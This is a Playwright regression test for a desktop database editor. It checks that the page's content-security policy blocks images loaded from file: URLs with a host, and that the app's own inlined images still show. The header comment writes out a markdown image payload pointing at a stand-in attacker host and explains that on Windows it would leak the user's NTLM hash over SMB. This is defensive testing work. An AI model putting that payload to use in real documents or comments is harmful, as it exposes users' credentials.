/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { expect, test } from '@playwright/test';

import { closeApp, launchApp, MOD, type AppHandle } from './helpers';

/*
 * What a database comment can make the editor fetch.
 *
 * Table and column comments reach Monaco's hover and completion docs, which Monaco renders as
 * markdown, images included. The language server now writes them as plain text
 * (server/src/schema/schemaIndex.ts, `markdownText`), and this is the wall behind it: the page's
 * own policy. The packaged page is a file: URL, where CSP's 'self' matched every file: URL, a host
 * included, so `![](file://attacker/share/x.png)` was fetched on hover; on Windows that is an SMB
 * connection carrying the user's NTLM hash. Driven in the real app window, under the policy the
 * build wrote into it, with main watching every request the page makes.
 */

let handle: AppHandle;

test.beforeAll(async () => {
	handle = await launchApp('editor-hover');
});

test.afterAll(async () => {
	await handle.app.evaluate(({ session }) => session.defaultSession.webRequest.onBeforeRequest(null));
	await closeApp(handle);
});

test('a file: image with a host is refused by the page and never requested', async () => {
	const { app, page } = handle;
	await app.evaluate(({ session }) => {
		const seen: string[] = [];
		(globalThis as unknown as { __beacons: string[] }).__beacons = seen;
		session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
			if (details.url.includes('beacon.invalid')) {
				seen.push(details.url);
			}
			callback({});
		});
	});
	const outcome = await page.evaluate(() => new Promise<string>((resolve) => {
		document.addEventListener('securitypolicyviolation', (event) => {
			// Chromium reports a blocked file: URL by its scheme alone.
			if (event.blockedURI === 'file' || event.blockedURI.includes('beacon.invalid')) {
				resolve(`blocked by ${event.effectiveDirective}`);
			}
		});
		const img = document.createElement('img');
		const settle = (): void => {
			setTimeout(() => resolve('loaded or tried to'), 500);
		};
		img.onload = settle;
		img.onerror = settle;
		img.src = 'file://beacon.invalid/share/x.png';
		document.body.appendChild(img);
	}));
	expect(outcome).toBe('blocked by img-src');
	// Give a request that did go out time to be seen before asserting there was none.
	await page.waitForTimeout(300);
	expect(await app.evaluate(() => (globalThis as unknown as { __beacons: string[] }).__beacons)).toEqual([]);
});

test('the app\'s own pictures still show, inlined', async () => {
	const { page } = handle;
	await page.keyboard.press(`${MOD}+Shift+P`);
	await page.fill('.palette input', 'About SnoutData Studio');
	await page.keyboard.press('Enter');
	const logo = page.locator('img.about-logo');
	await expect(logo).toBeVisible({ timeout: 10_000 });
	expect(await logo.getAttribute('src')).toMatch(/^data:image\/png;base64,/);
	await expect.poll(async () => logo.evaluate((img: HTMLImageElement) => img.complete && img.naturalWidth > 0)).toBe(true);
	await page.keyboard.press('Escape');
});
